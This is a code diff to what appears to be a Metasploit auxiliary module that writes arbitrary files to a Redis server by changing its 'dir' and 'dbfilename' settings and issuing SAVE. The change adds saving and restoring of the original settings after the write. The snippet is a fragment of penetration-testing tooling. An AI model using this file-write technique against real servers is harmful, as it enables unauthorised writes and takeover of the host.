@@ -43,8 +43,13 @@ class Metasploit3 < Msf::Auxiliary
     dirname = File.dirname(path)
     basename = File.basename(path)
 
-    original_dir = send_redis_command('CONFIG', 'GET', 'DIR')
-    data = send_redis_command('CONFIG', 'SET', 'DIR', dirname)
+    # Get the currently configured dir and dbfilename before we overwrite them;
+    # we should set them back to their original values after we are done.
+    # XXX: this is a hack -- we should really parse the responses more correctly
+    original_dir = send_redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
+    original_dbfilename = send_redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
+
+    data = send_redis_command('CONFIG', 'SET', 'dir', dirname)
     return unless data.include?('+OK')
 
     data = send_redis_command('CONFIG', 'SET', 'dbfilename', basename)
@@ -60,7 +65,11 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{peer} -- saved file to #{path}")
 
     data = send_redis_command('DEL', key)
-    return unless data.include?('+OK')
+    # cleanup
+    # XXX: ensure that these get sent if we prematurely return if a previous command fails
+    send_redis_command('CONFIG', 'SET', 'dir', original_dir)
+    send_redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
+    send_redis_command('SAVE')
   end
 
   def check
